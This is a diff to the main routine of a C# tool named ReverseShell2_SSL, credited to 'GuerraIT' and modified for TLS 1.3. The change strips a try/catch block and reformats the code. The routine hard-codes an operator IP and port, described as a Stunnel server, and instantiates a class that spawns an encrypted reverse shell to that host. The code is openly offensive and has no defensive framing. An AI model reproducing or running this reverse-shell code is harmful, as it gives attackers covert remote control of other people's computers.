@@ -40,29 +40,20 @@ namespace ReverseShell2_SSL
                                                                           
 ver 1.0 Coded by GuerraIT
 ver 1.1 Modified by Zinzloun (support TLS 1.3)                           
-
-                
-            ");
- 
+	");
+		
            
-            try
-            {
-               //CONFIG THIS: point to the Stunell server
-                string IP = "192.168.1.2";
-                int PORT = 9999;
+       //CONFIG THIS: point to the Stunell server
+	string IP = "192.168.1.2";
+	int PORT = 9999;
 
-                Console.WriteLine("Using the following connection " + IP + ":" + PORT);
+	Console.WriteLine("Using the following connection " + IP + ":" + PORT);
 
-                //spawn the reverse shell
-                ReverseShell_SSL rS = new ReverseShell_SSL(IP, PORT);
-            }
-            catch (Exception) {
-
-                Console.WriteLine(@"An error occured decoding the file: param reading: check the config file. Procudere aborted");
-                Thread.Sleep(5000);
-            }
+	//spawn the reverse shell
+	ReverseShell_SSL rS = new ReverseShell_SSL(IP, PORT);
            
-         }
+           
+        }
 
         
     }
